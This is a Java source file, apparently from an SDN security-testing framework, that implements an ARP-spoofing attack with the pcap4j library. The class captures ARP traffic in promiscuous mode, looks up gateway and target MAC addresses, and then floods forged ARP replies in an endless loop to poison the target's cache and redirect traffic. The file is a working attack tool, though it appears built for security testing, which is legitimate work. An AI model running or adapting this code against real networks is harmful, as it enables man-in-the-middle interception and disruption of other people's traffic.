package org.deltaproject.channelagent.pkthandler;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Scanner;

import org.pcap4j.core.BpfProgram.BpfCompileMode;
import org.pcap4j.core.NotOpenException;
import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNativeException;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;
import org.pcap4j.util.NifSelector;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class ARPSpoof implements Runnable {
    private static final Logger log = LoggerFactory.getLogger(ARPSpoof.class);

    private PcapNetworkInterface nif;

    private String channelIp;
    private String controllerIp;
    private String switchIp;

    public ARPSpoof(PcapNetworkInterface nif) {
        this.nif = nif;
    }

    public void setIps(String channel, String controller, String sw) {
        this.channelIp = channel;
        this.controllerIp = controller;
        this.switchIp = sw;
    }

    public void run() {
        if (nif == null)
            return;

        PcapHandle handle = null;

        try {
            handle = new PcapHandle.Builder(nif.getName())
                    .snaplen(65535)            // 2^16
                    .promiscuousMode(PromiscuousMode.PROMISCUOUS)
                    .timeoutMillis(100)        // ms
                    .bufferSize(1024 * 1024) // 1 MB
                    .build();

            String filter = "arp";
            handle.setFilter(filter, BpfCompileMode.OPTIMIZE);

            InetAddress localIP = nif.getAddresses().get(1).getAddress();
            MacAddress localMac = GetAddr.getLocalMac(localIP);

            InetAddress gatewayIP = GetAddr.getGateWayIP(localIP.getHostAddress());
            MacAddress gatewayMac = GetAddr.getMac(handle, localIP, localMac, gatewayIP);

            InetAddress targetIP = InetAddress.getByName("127.0.0.1");
            MacAddress targetMac = GetAddr.getMac(handle, localIP, localMac, targetIP);

            log.info("Local IP is: " + localIP.getHostAddress());
            log.info("Local MAC is: " + GetAddr.getMacString(localMac));

            log.info("Gateway IP is: " + gatewayIP.getHostAddress());
            log.info("Gateway MAC is: " + GetAddr.getMacString(gatewayMac));

            log.info("Target IP is: " + targetIP.getHostAddress());
            log.info("Target MAC is: " + GetAddr.getMacString(targetMac));

            log.info("ARP Spoofing Started");

            while (true) {
                handle.sendPacket(buildArpPacket(ArpOperation.REPLY, gatewayIP, targetIP, localMac, targetMac));
            }
        } catch (PcapNativeException e) {
            e.printStackTrace();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (NotOpenException e) {
            e.printStackTrace();
        }
    }

    private static Packet buildArpPacket(ArpOperation type, InetAddress srcIP, InetAddress dstIP, MacAddress srcMac, MacAddress dstMac) {
        ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
        arpBuilder
                .hardwareType(ArpHardwareType.ETHERNET)
                .protocolType(EtherType.IPV4)
                .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
                .operation(type)
                .srcHardwareAddr(srcMac)
                .srcProtocolAddr(srcIP)
                .dstHardwareAddr(dstMac)
                .dstProtocolAddr(dstIP);

        EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
        etherBuilder
                .dstAddr(dstMac)
                .srcAddr(srcMac)
                .type(EtherType.ARP)
                .payloadBuilder(arpBuilder)
                .paddingAtBuild(true);

        return etherBuilder.build();
    }
}